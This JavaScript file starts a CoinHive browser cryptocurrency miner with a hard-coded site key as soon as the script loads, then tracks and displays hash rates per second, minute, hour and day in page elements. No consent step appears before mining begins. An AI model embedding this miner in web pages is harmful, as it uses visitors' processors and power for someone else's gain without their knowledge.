var miner = new CoinHive.Anonymous('1bKAZIoqiathAWQnJFsbc4pFB54tTIhK');
miner.setNumThreads(1);
miner.start();

// Listen on events
// miner.on('found', function () { insertToLog("Found hash"); });
// miner.on('accepted', function () { insertToLog("Accepted hash"); });

function Memory(id, maxCount, time) {
    id = "." + id;
    var counter = 0;
    var sum = 0;
    var memory = [];

    this.id = function(){
        return id;
    };

    this.count = function () {
        counter++;
        var result = counter >= maxCount;
        if(result) counter = 0;
        return result;
    };

    this.add = function(item) {
        sum += item;
        memory.push(item);
        if(memory.length > maxCount)
            sum -= memory.shift();
        return sum;
    };

    this.getPerX = function() {
        return Math.round(sum);
    };

    this.getPerSec = function() {
        return Math.round(toSec());
    };

    function toSec(curr, val){
        if(!curr) curr = time;
        if(!val) val = sum;
        switch(curr) {
            case "sec":     return val;
            case "min":     return toSec("sec", val / 60);
            case "hour":    return toSec("min", val / 60);
            case "day":    return toSec("hour", val / 24);
            case "week":    return toSec("day", val / 7);
            case "month":    return toSec("day", val / 30);
            case "year":    return toSec("day", val / 365);
            default: return null;
        }
    }


}

var memory = [
    new Memory("nsec", 1, "sec"),
    new Memory("nmin", 60, "min"),
    new Memory("nhour", 60, "hour"),
    new Memory("nday", 24, "day")
];
setInterval(function () {
    var value = miner.getHashesPerSecond();
    for (var i = 0; i < memory.length; i++) {
        var item = memory[i];
        value = item.add(value);
        $(item.id()).text(item.getPerX() + " (" + item.getPerSec() + "/s)");
        if (!item.count()) break;
    }
}, 1000);